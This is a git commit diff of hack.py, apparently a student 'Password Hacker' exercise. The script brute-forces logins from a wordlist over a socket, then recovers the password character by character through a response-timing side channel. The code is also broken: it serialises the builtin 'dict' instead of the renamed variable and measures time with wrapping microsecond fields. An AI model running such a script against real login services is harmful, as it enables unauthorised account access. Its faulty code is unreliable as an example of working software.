383c4f7e95ea53505e4e8bf865dbaea00b152758
Zhumakul-Artykbay <artykbay.zhumakulov@mail.ru>
2020-10-21 01:15:23 +0600

    Final version of Brute-force hacking

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,30 +1,35 @@
-import sys, socket, json, itertools
+import sys, socket, json, datetime
+
 host, port = sys.argv[1:]
 
 letters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 with socket.socket() as client_socket:
     client_socket.connect((host, int(port)))
-    dict = {}
+    dictionary = {}
     with open('logins.txt', 'r') as login_file:
 
         for line in login_file:
             line = line.strip("\n")
-            dict["login"] = line
-            dict["password"] = ' '
+            dictionary["login"] = line
+            dictionary["password"] = ' '
             ms = json.dumps(dict, indent=4)
             client_socket.send(ms.encode())
             if json.loads(client_socket.recv(1024).decode())["result"] == "Wrong password!":
+                password = ""
                 break
-        dict["password"] = ''
-
+        dictionary["password"] = ''
     while True:
         for i in letters:
-            ms = json.dumps({"login":dict["login"], "password": dict["password"] + i}, indent=4)
+            dictionary["password"] += i
+            ms = json.dumps(dict, indent=4)
             client_socket.send(ms.encode())
+            start = datetime.datetime.now().microsecond
             res = json.loads(client_socket.recv(1024).decode())
-            if res["result"] == "Exception happened during login":
-                dict["password"] += i
-            elif res["result"] == "Connection success!":
-                dict["password"] += i
+            finish = datetime.datetime.now().microsecond
+            if res["result"] == "Connection success!":
                 print(json.dumps(dict))
                 exit()
+            if finish - start > 9000 and res["result"] == "Wrong password!":
+                pass
+            else:
+                dictionary["password"] = dictionary["password"][:-1]
